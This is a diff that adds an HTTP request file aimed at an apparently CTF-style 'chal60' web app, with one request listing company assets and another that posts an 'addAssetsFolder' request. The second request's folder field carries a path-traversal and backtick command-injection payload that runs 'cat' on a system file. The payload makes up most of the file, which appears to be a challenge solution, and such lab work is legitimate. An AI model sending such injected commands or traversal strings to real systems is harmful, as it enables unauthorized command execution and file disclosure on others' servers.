@@ -1,0 +1,27 @@
+
+@url = https://chal60-dchjiu5.vercel.app
+@url_get_company_assets = {{url}}/companyAssets
+@url_add_assets_folder = {{url}}/addAssetsFolder
+
+@id = fb9d1bfb-b80e-4c57-a6fc-6fbccd232623
+
+###
+
+POST {{url_get_company_assets}}
+Content-Type: application/json
+
+{
+  "companyId": "{{id}}"
+}
+
+###
+
+POST {{url_add_assets_folder}}
+Content-Type: application/json
+
+{
+  "companyId": "{{id}}",
+  "folder": "../../etc `cat ../../etc/protocols` #"
+}
+
+###
